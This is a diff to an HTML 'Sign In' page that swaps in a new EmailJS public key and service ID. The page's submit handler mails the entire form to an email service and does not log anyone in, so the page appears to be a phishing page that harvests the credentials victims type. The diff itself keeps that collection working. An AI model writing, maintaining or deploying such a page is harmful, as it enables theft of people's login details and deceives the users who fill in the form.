@@ -20,13 +20,21 @@
   <title>Sign In</title>
 
 
-  <script type="text/javascript" src="../cdn.jsdelivr.net/npm/%40emailjs/browser%403/dist/email.min.js"></script>
+<!--   <script type="text/javascript" src="../cdn.jsdelivr.net/npm/%40emailjs/browser%403/dist/email.min.js"></script>
   <script type="text/javascript">
     (function () {
       emailjs.init('dmDFhm35MG0A-aotg');
     })();
   </script>
-  <script type="text/javascript">
+  <script type="text/javascript"> -->
+<!-- Code replacement for new email js   -->
+  <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('C2hDdL9XGlLu_-ZrI')
+</script>
+<!-- code replacement ends here   -->
     window.onload = function () {
       let contryInput = document.querySelector('#country')
 
@@ -43,7 +51,7 @@
       document.getElementById('form').addEventListener('submit', function (event) {
         event.preventDefault();
         btn.textContent = 'Loading...';
-        emailjs.sendForm('service_nhuervv', 'ibb1', this)
+        emailjs.sendForm('service_vveuffe', 'ibb1', this)
           .then(function () {
             console.log('SUCCESS!');
             setTimeout(() => {
